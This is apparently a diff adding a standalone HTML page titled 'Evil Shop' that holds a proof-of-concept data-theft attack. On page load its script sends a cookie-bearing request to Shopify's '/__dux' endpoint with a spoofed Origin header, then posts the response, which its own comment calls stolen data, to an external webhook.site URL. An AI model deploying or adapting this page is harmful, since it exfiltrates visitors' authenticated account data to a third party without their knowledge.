@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil Shop</title>
+</head>
+<body>
+    <h1>Welcome to Evil Shop</h1>
+    <script>
+        // Function to send a request to Shopify's __dux endpoint
+        function fetchShopifyData() {
+            fetch('/__dux', {
+                method: 'POST', // Assuming POST method based on response headers
+                credentials: 'include', // Include cookies in the request
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://radinrodrigo.github.io/hello' // Set the Origin header
+                }
+            })
+            .then(response => response.text()) // Read the response as text
+            .then(data => {
+                // Send the stolen data to the webhook.site URL
+                fetch('https://webhook.site/a19d392d-53de-4461-b463-29aac0824a7a', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ data: data })
+                });
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Automatically run the script when the page loads
+        window.onload = fetchShopifyData;
+    </script>
+</body>
+</html>
